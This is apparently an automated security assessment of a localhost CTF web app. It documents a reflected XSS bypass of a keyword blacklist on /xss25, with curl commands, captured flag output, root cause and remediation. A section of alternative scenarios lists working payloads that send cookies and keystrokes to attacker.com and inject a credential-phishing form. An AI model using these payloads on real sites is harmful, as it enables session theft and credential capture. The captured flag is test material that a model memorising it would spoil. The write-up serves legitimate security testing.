# Security Assessment Report

## Executive Summary
- Target: http://localhost:5000/
- Assessment Date: October 31, 2025
- Scope: Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
No authentication vulnerabilities were found. The application implements no authentication system by design - all endpoints are intentionally public for this CTF challenge environment.

**Authorization Vulnerabilities:**
No authorization vulnerabilities were found. The application implements no authorization system - there are no user roles, privileges, or access controls.

**Cross-Site Scripting (XSS) Vulnerabilities:**
**Critical vulnerability successfully exploited.** The `/xss25` endpoint contains a reflected XSS vulnerability in the `solution` POST parameter. User input is rendered into an unquoted HTML attribute context without proper sanitization. The application employs a weak blacklist filter blocking only 8 keywords (`script`, `onload`, `onmouseover`, `onclick`, `onbegin`, `onerror`, `svg`, `'`) which is trivially bypassed using alternative event handlers such as `onfocus`. Successful exploitation triggers JavaScript execution in both user browsers and the PhantomJS validation engine, resulting in disclosure of the CTF flag: `flag{6fdb8636-6391-4863-a64a-f5d138d2ebbc}`. In a production environment, this vulnerability would enable session hijacking, credential theft, keylogging, phishing attacks, and CSRF exploitation.

**SQL/Command Injection Vulnerabilities:**
No SQL or command injection vulnerabilities were found. The application uses no database system, and subprocess execution uses hardcoded array arguments with no user input in command parameters.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found. While the application uses PhantomJS as a headless browser for XSS validation, the destination URL is hardcoded to `http://localhost:5000/static/[random].html` with no user control over the scheme, host, port, or path components.

## Network Reconnaissance

**Port Scanning Results (nmap):**
- **Port 5000/tcp (Target Application):** HTTP service running Werkzeug/1.0.1 Python/2.7.18 with page title "Dalgona Challenges" - primary attack surface
- Port 22/tcp: SSH (OpenSSH 9.9) - infrastructure service
- Port 80/tcp: HTTP (Caddy httpd) - infrastructure service
- Port 443/tcp: SSL/HTTPS - infrastructure service
- Port 445/tcp: Microsoft-ds (SMB) - Message signing enabled and required
- Port 631/tcp: CUPS printing service (2.3.4) with robots.txt disallowing `/`
- Port 3703/tcp: HTTP service requiring `baml-original-url` header - non-standard service
- Port 8000/tcp: WSGIServer (Python 3.12.9) serving "SSTI Demo" - separate test application
- Port 8001/tcp: WSGIServer (Python 3.12.9) serving "SSTI Demo" - separate test application
- Port 8888/tcp: BaseHTTPServer (Python 3.12.9) serving "SSRF Test Server" - separate test application
- Port 9001/tcp: Tor OR port - anonymity service
- Port 9876/tcp: Unidentified service
- Port 9999/tcp: SimpleHTTPServer (Python 3.12.9) with directory listing enabled - potential information disclosure

**Subdomain Discovery (subfinder):**
Multiple localhost subdomains discovered, likely false positives from the scanning environment rather than actual application infrastructure: server02.counterintel.localhost, mail.regency.localhost, autodiscover.localhost, owa.regency.localhost, and 11 others. These are not related to the XBEN-004-24 target application.

**Security Observations:**
- **Deprecated Technology Stack:** Target application runs on Python 2.7.18 (EOL since January 2020) with Flask 1.1.4 and Werkzeug 1.0.1 - all outdated with no security patches
- **Unencrypted Communication:** Target operates over HTTP only, no HTTPS/TLS configured
- **SMB Security:** Port 445 shows SMB2 with message signing enabled and required - properly secured
- **Information Disclosure:** Port 9999 exposes directory listing via SimpleHTTPServer
- **Clock Skew:** System clock shows -1m42s skew relative to actual time
- **Multiple Test Services:** Ports 8000, 8001, and 8888 expose additional Python-based test applications for SSTI and SSRF testing - expanded attack surface beyond primary target

# Cross-Site Scripting (XSS) Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-VULN-01: Reflected XSS in /xss25 POST Parameter with CTF Flag Disclosure

**Summary:**
- **Vulnerable location:** `http://localhost:5000/xss25` (POST parameter: `solution`)
- **Overview:** Reflected XSS vulnerability allowing arbitrary JavaScript execution in both user browsers and the PhantomJS validation engine. Successful exploitation triggers disclosure of the CTF flag.
- **Impact:** Complete compromise of user sessions, unauthorized JavaScript execution in victim browsers, and server-side flag disclosure through PhantomJS exploitation. In a real-world scenario, this would enable session hijacking, credential theft, and unauthorized actions on behalf of users.
- **Severity:** **Critical**

**Prerequisites:**
- Target application accessible at `http://localhost:5000/xss25`
- HTTP client capable of sending POST requests (curl, browser, Burp Suite, etc.)
- No authentication required (application is publicly accessible)

**Exploitation Steps:**

1. **Send malicious POST request with XSS payload**
   ```bash
   curl -X POST http://localhost:5000/xss25 \
     -d 'solution=></html><body><input autofocus onfocus=alert("XSS")>'
   ```

   **Explanation:** The `solution` parameter is reflected into an unquoted HTML attribute context within an `<input>` tag. The application applies a weak blacklist filter (`['script', 'onload', 'onmouseover', 'onclick', 'onbegin', 'onerror', 'svg', "'']`) but fails to block numerous other event handlers including `onfocus`.

2. **Bypass Strategy - Early HTML Closure**

   The payload `></html><body><input autofocus onfocus=alert("XSS")>` works by:
   - `>` - Closes the existing `<input>` tag where our payload is injected
   - `</html>` - Closes the malformed HTML document containing problematic CSS links
   - `<body><input autofocus onfocus=alert("XSS")>` - Creates a fresh, minimal HTML context

   **Why this bypass is necessary:** The application's default HTML template includes broken CSS links that cause PhantomJS to output TypeErrors during page load, preventing the alert handler output from being read as the first line. By closing the HTML early and creating a minimal context, we avoid these CSS loading errors.

3. **PhantomJS Validation Trigger**

   The application automatically:
   - Embeds the payload into a complete HTML page
   - Writes the page to a temporary file in `static/[random].html`
   - Spawns PhantomJS to load the page via `http://localhost:5000/static/[random].html`
   - PhantomJS executes the `autofocus` attribute and triggers the `onfocus` event handler
   - The `alert("XSS")` executes, and PhantomJS's `page.onAlert` handler outputs "XSS" to stdout
   - Python app reads the first line of stdout: `result = proc.stdout.readline().strip()`
   - If `result == "XSS"`, the application discloses the flag

4. **Verify flag disclosure in HTTP response**
   ```bash
   curl -s -X POST http://localhost:5000/xss25 \
     -d 'solution=></html><body><input autofocus onfocus=alert("XSS")>' \
     | grep -i "flag\|Congratulations"
   ```

   **Expected output:**
   ```html
   <div class="solution-text"><img src="static/img/cookies/success_star.png" alt="Correct" width="150" height="150"><br>Congratulations!<p> Here is the flag: flag{6fdb8636-6391-4863-a64a-f5d138d2ebbc}</div>
   ```

**Proof of Impact:**

**CTF Flag Captured:** `flag{6fdb8636-6391-4863-a64a-f5d138d2ebbc}`

**Complete Exploitation Evidence:**
```bash
$ curl -s -X POST http://localhost:5000/xss25 -d 'solution=></html><body><input autofocus onfocus=alert("XSS")>' | grep "Congratulations\|flag{"

<div class="solution-text"><img src="static/img/cookies/success_star.png" alt="Correct" width="150" height="150"><br>Congratulations!<p> Here is the flag: flag{6fdb8636-6391-4863-a64a-f5d138d2ebbc}</div>
```

**Alternative Exploitation Scenarios:**

In addition to the CTF flag disclosure demonstrated above, this XSS vulnerability enables the following real-world attack scenarios:

1. **Session Hijacking** (if sessions were implemented)
   - Payload: `></html><body><input autofocus onfocus=fetch("https://attacker.com/steal?cookie="+document.cookie)>`
   - Impact: Exfiltrates victim session cookies to attacker-controlled server

2. **Keylogging Attack**
   - Payload: `></html><body><input autofocus onfocus='document.onkeypress=function(e){fetch("https://attacker.com/log?key="+e.key)}'>`
   - Impact: Captures all keystrokes and sends them to attacker

3. **Phishing via DOM Manipulation**
   - Payload: `></html><body><input autofocus onfocus='document.body.innerHTML="<h1>Session Expired</h1><form action=\"https://attacker.com/phish\"><input name=user placeholder=Username><input name=pass type=password placeholder=Password><button>Login</button></form>"'>`
   - Impact: Replaces page content with convincing phishing form

4. **CSRF via XSS**
   - Payload: `></html><body><input autofocus onfocus='fetch("/admin/delete-user/123",{method:"POST"})'>`
   - Impact: Performs unauthorized actions on behalf of the victim

**Notes:**

**Blacklist Bypass Analysis:**
The application implements a blacklist filter blocking: `['script', 'onload', 'onmouseover', 'onclick', 'onbegin', 'onerror', 'svg', "'']`

However, this blacklist is trivially bypassable because:
- It only blocks 8 keywords out of 100+ HTML event handlers
- Unblocked handlers include: `onfocus`, `onfocusin`, `onblur`, `oninput`, `onchange`, `onanimationstart`, `onloadstart`, etc.
- It blocks single quotes (`'`) but not double quotes (`"`) or backticks
- It blocks `<svg>` but allows `<img>`, `<iframe>`, `<video>`, `<audio>`, `<object>`, etc.
- No HTML entity encoding or attribute encoding is applied

**Root Cause:**
The vulnerability exists because user input flows from `request.form.get('solution','')` through string formatting (`'> {0}'.format(msg)`) directly into an unquoted HTML attribute context without any sanitization:

```python
# app.py line 67
value = "" if msg == "" else '> {0}'.format(msg)

# Template injection at line 76
return XSS_CONTENT_POST.format("25","Star",value,"",error_msg)

# Rendered as (from constants.py):
<input type=text name=solution placeholder="Enter solution..." {value}>
```

The lack of quotes around `{value}` allows space-separated attribute injection, and the absence of HTML entity encoding allows event handler injection.

**Technology Stack Vulnerabilities:**
- Python 2.7.18 (End-of-life since January 2020, no security patches)
- Flask 1.1.4 (Outdated, current stable is 3.x)
- PhantomJS 2.1.1 (Deprecated since 2018, contains known vulnerabilities)
- No Content Security Policy (CSP)
- No X-XSS-Protection header
- Unencrypted HTTP communication

**Remediation Recommendations:**
1. **Primary Fix:** Implement context-aware output encoding using `html.escape()` or Jinja2's autoescaping
2. **Defense in Depth:** Add Content Security Policy header: `Content-Security-Policy: default-src 'self'; script-src 'self'`
3. **Input Validation:** Replace blacklist with whitelist validation accepting only alphanumeric characters
4. **Template Security:** Use quoted attributes: `<input value="{value}">` → `<input value="{value | e}">`
5. **Framework Upgrade:** Migrate to Python 3.x and latest Flask version
6. **Replace PhantomJS:** Use modern headless browsers (Puppeteer, Playwright) with better security
